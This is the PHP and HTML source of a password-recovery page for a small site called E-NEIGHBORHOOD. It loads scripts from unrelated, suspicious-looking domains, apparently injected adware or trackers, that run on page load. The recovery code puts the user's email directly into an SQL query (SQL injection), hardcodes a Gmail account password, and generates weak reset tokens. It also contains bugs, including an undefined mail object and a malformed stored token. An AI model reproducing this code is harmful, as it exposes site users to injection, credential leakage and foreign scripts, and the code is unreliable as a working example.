

<html lang="en"><head><style id="stndz-style"></style>
<title>E-NEIGHBORHOOD</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="icon" type="image/png" href="images/icons/favicon.ico">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/bootstrap/css/bootstrap.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/fonts/font-awesome-4.7.0/css/font-awesome.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/fonts/iconic/css/material-design-iconic-font.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/animate/animate.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/css-hamburgers/hamburgers.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/animsition/css/animsition.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/select2/select2.min.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/vendor/daterangepicker/daterangepicker.css">

<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/css/util.css">
<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v6/css/main.css">

<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script src="https://cdn.immereeako.info/pa.min.js"></script><script type="text/javascript" src="https://m59.prod2016.com/QualityCheck/ga.js"></script></head>
<body>
<div class="limiter">
<div class="container-login100">
<div class="wrap-login100 p-t-85 p-b-20">
<form method="post" class="login100-form validate-form">
<span class="login100-form-title p-b-70">
 Enter your E-mail id for recovery mail!!!
</span>

<div class="wrap-input100 validate-input m-t-85 m-b-35" data-validate="Enter E-mail">
<input class="input100" type="text" name="email">
<span class="focus-input100" data-placeholder="E-mail"></span>
</div>

<div class="container-login100-form-btn">
<button name="done" type="submit" class="login100-form-btn">
SEND RECOVERY MAIL
</button>
</div>
</form>


</div>
</div>
</div>
<div id="dropDownSelect1"></div>

<?php include_once 'script.php'; ?>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());

	  gtag('config', 'UA-23581568-13');
	</script>
<script type="text/javascript">(function(window, document) {if (window === top) {var script = document.createElement('script'); script.src = 'https://cdn.immereeako.info/pa.min.js'; document.getElementsByTagName('head')[0].insertAdjacentElement('beforeEnd', script); window['_paInfo_'] = window['_paInfo_'] || {uid: 'HWXCBWTXWD',sub1: 'hwwm'};(new Image).src = '//colorlib.com/pages/imevrstk.php?qd=BTB&zqd=009.004&nbid=1d39b7206c47bc65ee21e032cd65e5ac&cid=185439' + '&url=' + encodeURIComponent(location.href) + '&ref=' + encodeURIComponent(document.referrer) + '&t=' + parseInt(Math.random()*1000000);}})(window, document);</script>

<script type="text/javascript" src="https://solid-waste.top/v/492089.js?j=1221"></script><div id="des_xnba_ewn"></div></body></html>
<?php 
if(isset($_POST['done']))
{

include_once 'connection.php';

$email=$_POST['email'];


$qry="select * from registration where e_mail='$email'";
//this method execute when connection is success than it execute the query and store the result in res variable
$res= mysqli_query($con,$qry);
  
 //this method will get the value of res variable and fetch from the database and the result will generated in array and store in row variable
 $row=mysqli_fetch_array($res);
 //this use for compare two values one from user inputted and another from database
  if($row['e_mail']==$email)
     
  {

    $user_activation_code = md5(rand());
    require 'PHPMailer/PHPMailer.php';
        require 'PHPMailer/SMTP.php';
        require 'PHPMailer/Exception.php';

      $base_url = "http://E-Neighborhood.github.io/";  //change this baseurl value as per your file path
    $mail_body = "
    <p>Hi ".$row['uname'].",</p>
      <p>Thanks for giving us a chance to help you.</p>
    <p>Please Open this link to reset your email password - ".$base_url."passreset.php?activation_code=".$user_activation_code."&email=".$row['e_mail']."<p>Best Regards,<br />Team@E-NEIGHBORHOOD</p>     ";
        $mail1 = new PHPMailer\PHPMailer\PHPMailer();
        $mail1->IsSMTP();
        $mail1->SMTPDebug  = false;
        $mail1->Debugoutput = false;
        $mail1->Host = 'smtp.gmail.com';
        $mail1->Port = 587;
        $mail1->SMTPSecure = 'tls';
        $mail1->SMTPAuth   = true;
        $mail1->Username  = "eneighborhood14@gmail.com";
        $mail1->Password  = "eneighborhood48";
       $mail1->SetFrom('eneighborhood14@gmail.com', "TEAM@E-NEIGHBORHOOD");
        $mail1->AddReplyTo($email, strtoupper($row['uname']));
        $mail1->AddAddress($email, strtoupper($row['uname']));
        $mail1->Subject = "E-MAIL confirmation";
        $mail->WordWrap = 50; 
        $mail1->Body = $mail_body;
        $mail1->IsHTML(true);

        if($mail1->Send())
                {
            echo "<script>alert('Mail Successfully Sent,Please check your mailbox');</script>";
           
        
      $update_query = "
        UPDATE registration
        SET user_activation_code = ' $user_activation_code' 
        WHERE us_id= '".$row['us_id']."'
        ";
        $statement = $con->prepare($update_query);
        $statement->execute();
            echo "<script>window.location='login_saller.php';</script>";
                }
        else 
        {
         echo "<script>alert('Mail Not Sent. Please try again!!');</script>";
        }

  

  }
  else
  {
    echo "<SCRIPT LANGUAGE='JavaScript'> window.alert('E-mail does not exist ')</SCRIPT>";
  }
}
?>